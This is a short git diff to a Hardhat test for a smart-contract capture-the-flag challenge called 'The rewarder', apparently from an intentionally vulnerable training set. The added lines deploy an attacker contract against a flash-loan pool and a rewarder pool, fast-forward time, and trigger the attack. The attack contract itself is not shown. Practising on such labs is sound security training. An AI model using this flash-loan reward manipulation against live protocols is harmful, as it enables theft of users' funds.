@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { time } = require("@nomicfoundation/hardhat-network-helpers");
 
 describe('[Challenge] The rewarder', function () {
     const TOKENS_IN_LENDER_POOL = 1000000n * 10n ** 18n; // 1 million tokens
@@ -70,6 +71,10 @@ describe('[Challenge] The rewarder', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let attackerFactory = await ethers.getContractFactory('TheRewarderAttacker', player);
+        let attacker = await attackerFactory.deploy(flashLoanPool.address, rewarderPool.address);
+        await time.increase(5 * 24 * 60 * 60);
+        await attacker.attack();
     });
 
     after(async function () {
